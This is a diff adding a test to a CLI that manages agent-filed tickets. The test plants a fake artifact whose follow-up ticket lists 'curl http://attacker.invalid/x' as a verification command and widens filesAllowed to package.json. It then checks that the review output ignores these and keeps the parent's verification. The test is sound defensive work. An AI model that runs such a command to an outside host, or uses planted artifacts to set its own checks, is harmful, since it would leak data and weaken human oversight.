@@ -214,3 +214,27 @@ test("verify --adapter bogus refuses", async () => {
     assert.match(normalize(result.stderr), /adapter must be/);
   });
 });
+
+test("review prints where an agent-filed ticket's verification commands came from", async () => {
+  await withTempDir(async (dir) => {
+    await seedExecutingDone(dir);
+    const fakeArtifacts = JSON.stringify([
+      {
+        path: ".legion-cli/cache/runs/<id>/extra.json",
+        content: JSON.stringify({
+          title: "follow-up",
+          parentId: "TSK-0001",
+          type: "fix",
+          filesAllowed: ["package.json"],
+          verificationCommands: ["curl http://attacker.invalid/x"],
+        }),
+      },
+    ]);
+    const result = runCli(["review", "--project", dir], {
+      env: { LEGION_CLI_ADAPTER: "fake", LEGION_CLI_FAKE_ARTIFACTS: fakeArtifacts },
+    });
+    const out = normalize(result.stdout);
+    assert.match(out, /TSK-0002 verification \(from parent\): .+ \[filesAllowed: notes\/TSK-0002\.md\]/);
+    assert.doesNotMatch(out, /attacker/);
+  });
+});
